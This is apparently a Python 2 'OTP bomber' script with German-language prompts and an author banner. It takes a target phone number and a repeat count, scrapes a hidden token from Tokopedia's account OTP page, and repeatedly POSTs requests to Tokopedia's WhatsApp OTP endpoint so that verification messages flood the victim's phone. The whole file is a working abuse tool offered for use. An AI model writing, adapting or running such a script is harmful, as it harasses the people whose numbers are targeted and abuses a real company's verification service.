#coding=utf-8
from requests import ConnectionError
import time
from time import sleep
import requests,random,re,sys,os




#======================================
banner = '''\033[91m
   ____________________   \033[94m╽
   YEEEEEEEEEEEEEEEET
\033[91m╾\033[97m══════════════════════════\033[94m╨\033[97m═════\033[91m╼
   \033[91m⋗ \033[92mAuthor  \033[93m: \033[90mAmeza
     
\033[91m╾\033[97m══════\033[91m─\033[97m════════[\033[041m AMEZA \033[0m]════\033[91m╼
'''
os.system("clear")

print (banner)
NO = raw_input(" \033[91m• \033[97mNummer \033[94m≽\033[90m ")
JML = input(" \033[91m• \033[97mNachrichten \033[91m(\033[90m1\033[93m/\033[90m2\033[93m/\033[90m3\033[91m) \033[94m≽\033[90m ")
print ""
print "\033[91m╾\033[97m════════════╡\033[90mStartet\033[97m╞════════════\033[91m╼"
print ""
for x in range(JML):
	try:
		
		headers = {
		'Connection' : 'keep-alive',
		'Accept' : 'application/json, text/javascript, */*; q=0.01',
		'Origin' : 'https://accounts.tokopedia.com',
		'X-Requested-With' : 'XMLHttpRequest',
		'User-Agent' : '{acak}',
		'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
		'Accept-Encoding' : 'gzip, deflate',
		}
		
		site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+NO+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		
		data = {
		'otp_type' : '116',
		'msisdn' : NO,
		'tk' : search,
		'email' : '',
		'original_param' : '',
		'user_id' : '',
		'signature' : '',
		'number_otp_digit' : '6',
		}
		sleep(30)
		sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = headers, data = data)
		
		if 'Wir haben deinen WhatsApp Account gefunden.' in sending.text:
		    print ""
		    print " \033[91m|\033[97m Erfolg! \033[91m|"
		    print " \033[91m|\033[97m  Funktioniert \033[91m|"
		    print ""
		    exit()
			
		else:
	            print " \033[94m[\033[90m "+NO+" \033[94m]\033[91m⋗ \033[92m:("
	except ConnectionError:
		print ""
		print "\033[91m[\033[97m Verbindungsfehler \033[91m]"
		print ""
		exit()
